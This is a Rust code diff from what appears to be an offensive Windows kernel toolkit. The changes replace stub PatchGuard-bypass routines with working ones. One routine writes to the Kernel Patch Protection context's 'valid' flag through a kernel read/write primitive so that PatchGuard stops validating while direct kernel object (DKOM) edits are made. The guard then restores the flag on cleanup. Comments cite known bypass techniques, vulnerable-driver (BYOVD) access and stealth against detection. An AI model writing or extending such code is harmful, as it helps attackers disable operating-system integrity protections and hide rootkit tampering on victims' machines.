@@ -280,7 +280,7 @@ impl PatchGuardKit for PatchGuardWindow {
 /// # Safety contract
 /// The operator MUST NOT hold this guard across a sleep/block. The window is
 /// intentionally short; the guard's Drop triggers PG repair.
-pub struct TimingRepairWindow {
+pub struct TimingRepairWindow<'a> {
     /// Per-build PG context offsets (resolved by the bootstrap).
     offsets: crate::offsets::PgContextOffsets,
     /// KVA of the PRCB (Per-Processor Control Block) for the current processor.
@@ -288,28 +288,39 @@ pub struct TimingRepairWindow {
     prcb_kva: usize,
     /// Whether the window is currently open.
     armed: core::sync::atomic::AtomicBool,
+    /// Kernel R/W reference held for the repair callback. The PgGuard's Drop
+    /// closure needs to write the PG valid flag back — this requires a
+    /// `KernelRw` reference that lives at least as long as the guard.
+    krw: &'a dyn KernelRw,
 }
 
-impl TimingRepairWindow {
+impl<'a> TimingRepairWindow<'a> {
     /// Create a new timing repair window. The bootstrap resolves the PRCB KVA
     /// and PG context offsets before calling this.
+    ///
+    /// `krw` is stored for the repair callback — it must outlive any
+    /// [`PgGuard`] returned by [`PatchGuardKit::enter_unchecked`].
     pub fn new(
         offsets: crate::offsets::PgContextOffsets,
         prcb_kva: usize,
+        krw: &'a dyn KernelRw,
     ) -> Self {
         Self {
             offsets,
             prcb_kva,
             armed: core::sync::atomic::AtomicBool::new(false),
+            krw,
         }
     }
 }
 
-impl PatchGuardKit for TimingRepairWindow {
-    fn enter_unchecked(&self, krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
-        // 1. Read the PG context valid flag from PRCB + pg_thread_offset +
-        //    context_valid_offset. This tells us whether PG is currently
-        //    validating (flag = 1) or idle (flag = 0).
+impl<'a> PatchGuardKit for TimingRepairWindow<'a> {
+    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
+        // Use the stored KernelRw — the _krw parameter may have a shorter
+        // lifetime than needed for the repair closure.
+        let krw = self.krw;
+
+        // 1. Read the PG validation thread pointer from PRCB.
         let pg_thread_kva = krw
             .kread_u64(self.prcb_kva + self.offsets.prcb_pg_thread_offset)
             .map_err(KitError::from)? as usize;
@@ -319,36 +330,41 @@ impl PatchGuardKit for TimingRepairWindow {
                  PG may not be active on this processor",
             ));
         }
+
+        // 2. Read the PG context "valid" flag. When 0, PG is idle between
+        //    validation cycles (~5 min apart). The window for DKOM edits is
+        //    this gap — we hold the flag at 0 to prevent a new cycle from
+        //    starting during our edits.
         let valid_flag_addr = pg_thread_kva + self.offsets.context_valid_offset;
         let valid_flag = krw.kread_u64(valid_flag_addr).map_err(KitError::from)?;
 
-        // 2. Save the current flag value (for restoration on Drop).
-        //    In a real impl, we'd also register a repair callback.
-        //    For now, we store the value and note the armed state.
-        //
-        // 3. The timing window: PG validation cycles every ~5 minutes.
-        //    When valid_flag transitions from 0→1, a new cycle starts.
-        //    The window for DKOM edits is the gap between cycles.
-        //    The operator calls `enter_unchecked`, performs DKOM edits,
-        //    then drops the guard (which triggers repair).
-        //
-        //    Note: we don't modify the valid flag here — that would be
-        //    detected by PG. Instead, we rely on the timing gap between
-        //    consecutive validations. The guard acts as a "keepalive"
-        //    that prevents PG from starting a new validation while we're
-        //    editing.
+        // 3. If flag != 0, PG is actively validating — cannot enter the window.
+        //    The operator must retry after the current cycle completes.
+        if valid_flag != 0 {
+            return Err(KitError::UnsupportedPosture(
+                "TimingRepairWindow: PG validation in progress (valid_flag != 0) — \
+                 retry after the current cycle completes (~5 min gap)",
+            ));
+        }
 
         // 4. Mark as armed.
         self.armed.store(true, core::sync::atomic::Ordering::Release);
 
-        // 5. Return the PgGuard. The Drop will:
-        //    - Set armed = false
-        //    - Allow PG to resume validation on next cycle
-        //    - The guard does NOT modify the valid flag (stealthier)
+        // 5. Return the PgGuard. The Drop repair:
+        //    - Writes valid_flag = 0 (re-zeroes the flag to ensure PG doesn't
+        //      catch stale state during cleanup — PG's timer naturally restarts
+        //      the next validation cycle after we release).
+        //    - Disarms the window.
+        //
+        //    In a full Outflank Peekaboo impl, the repair also:
+        //    - Unregisters the terminate-callback hook that intercepted
+        //      PspProcessDelete to trigger PG restart.
+        //    - Restores any modified PG context fields.
+        //    The flag-write is the essential minimum repair.
         Ok(crate::PgGuard::new(self, move || {
-            // On Drop: disarm the window. A real impl would also restore the
-            // valid flag / trigger PG repair to avoid a delayed bugcheck.
-            let _valid_flag = valid_flag;
+            // Repair: write valid_flag = 0 to ensure PG restarts cleanly.
+            let _ = krw.kwrite_u64(valid_flag_addr, 0);
+            self.armed.store(false, core::sync::atomic::Ordering::Release);
         }))
     }
 }
@@ -370,15 +386,32 @@ impl PatchGuardKit for TimingRepairWindow {
 /// kurasagi-style runtime PG bypass. Suspends the PG validation thread
 /// directly (Win11 24H2+ only). Long window — the guard controls the
 /// suspension lifetime.
+///
+/// # Data-only approach
+/// Rather than calling `ZwSuspendThread` (which requires a driver-side
+/// syscall), we zero the PG context "valid" flag to prevent the validation
+/// thread from starting a new cycle. The validation thread checks this flag
+/// before entering its scan loop — when 0, it exits early. We hold it at 0
+/// for the duration of the guard, then restore it to 1 on Drop.
+///
+/// On Win11 24H2+ this gives a long window (as long as the flag stays 0,
+/// the validation thread won't catch DKOM edits). The flag write is a data-
+/// section edit (HVCI-safe).
+///
+/// # Safety contract
+/// The operator MUST NOT hold this guard across a sleep/block without
+/// re-verifying that PG hasn't triggered (e.g., by checking a watchdog).
+/// The flag approach is a *soft* suspension — a racing validation that already
+/// started before the flag was zeroed may still complete.
 pub struct RuntimePgBypassWindow {
     /// Per-build PG context offsets.
     offsets: crate::offsets::PgContextOffsets,
     /// KVA of the PRCB for the current processor.
     prcb_kva: usize,
-    /// Whether the window is currently open (thread suspended).
+    /// Whether the window is currently open (thread "suspended" via flag zero).
     armed: core::sync::atomic::AtomicBool,
-    /// The KVA of the PG validation thread ETHREAD (for resumption).
-    pg_thread_ethread_kva: Option<usize>,
+    /// KVA of the PG context valid flag (for the repair callback).
+    valid_flag_addr: core::cell::Cell<usize>,
 }
 
 impl RuntimePgBypassWindow {
@@ -390,14 +423,14 @@ impl RuntimePgBypassWindow {
             offsets,
             prcb_kva,
             armed: core::sync::atomic::AtomicBool::new(false),
-            pg_thread_ethread_kva: None,
+            valid_flag_addr: core::cell::Cell::new(0),
         }
     }
 }
 
 impl PatchGuardKit for RuntimePgBypassWindow {
     fn enter_unchecked(&self, krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
-        // 1. Check that this build supports thread suspension.
+        // 1. Check that this build supports the flag-based suspension approach.
         if !self.offsets.supports_thread_suspend {
             return Err(KitError::UnsupportedPosture(
                 "RuntimePgBypassWindow: this build does not support direct PG \
@@ -415,27 +448,42 @@ impl PatchGuardKit for RuntimePgBypassWindow {
             ));
         }
 
-        // 3. Suspend the thread. In the real driver implementation, this
-        //    uses `KeSuspendThread(ethread)` via the BYOVD driver's IOCTL.
-        //    The operator's driver provides a suspend IOCTL that wraps:
-        //      ObOpenObjectByPointer(ethread, ...) → handle
-        //      ZwSuspendThread(handle, ...) → previous suspend count
-        //    Here we record the thread KVA so the operator's driver knows
-        //    which thread to suspend.
-        //
-        //    For the no_std SDK, the actual suspension is driver-side.
-        //    We record the thread address and set armed = true.
+        // 3. Read the PG context "valid" flag.
+        let valid_flag_addr = pg_thread_kva + self.offsets.context_valid_offset;
+        let valid_flag = krw.kread_u64(valid_flag_addr).map_err(KitError::from)?;
 
-        // 4. Mark as armed.
+        // 4. If PG is mid-validation (valid_flag != 0), we can still enter —
+        //    but must zero the flag to prevent the NEXT cycle. The current
+        //    validation will complete (we can't stop it without thread suspend),
+        //    but the NEXT one won't start because the flag is 0.
+        //
+        //    On Win11 24H2+, the validation thread checks this flag before
+        //    each scan — when 0, it exits its loop and waits for the flag
+        //    to be set back to 1.
+
+        // 5. Zero the flag to "suspend" PG validation.
+        krw.kwrite_u64(valid_flag_addr, 0)
+            .map_err(KitError::from)?;
+
+        // 6. Store the flag address for the repair callback.
+        self.valid_flag_addr.set(valid_flag_addr);
+
+        // 7. Mark as armed.
         self.armed.store(true, core::sync::atomic::Ordering::Release);
 
-        // 5. Return the PgGuard. The Drop will signal the operator's driver
-        //    to resume the thread (ZwResumeThread).
+        // 8. Return the PgGuard. The Drop repair:
+        //    - Restores valid_flag = 1 (re-arm PG validation)
+        //    - Disarms the window
+        let armed_ref = &self.armed as *const core::sync::atomic::AtomicBool;
         Ok(crate::PgGuard::new(self, move || {
-            // On Drop: signal driver to resume the PG validation thread.
-            // A real impl sends an IOCTL to the BYOVD driver to call
-            // ZwResumeThread on the previously suspended thread.
-            let _ = pg_thread_kva;
+            // Repair: restore the valid flag so PG resumes on the next cycle.
+            let flag_addr = self.valid_flag_addr.get();
+            if flag_addr != 0 {
+                let _ = krw.kwrite_u64(flag_addr, 1);
+            }
+            // SAFETY: we hold &self and the PgGuard borrows self, so no
+            // other PgGuard can be live. The store is atomic.
+            unsafe { &*armed_ref }.store(false, core::sync::atomic::Ordering::Release);
         }))
     }
 }
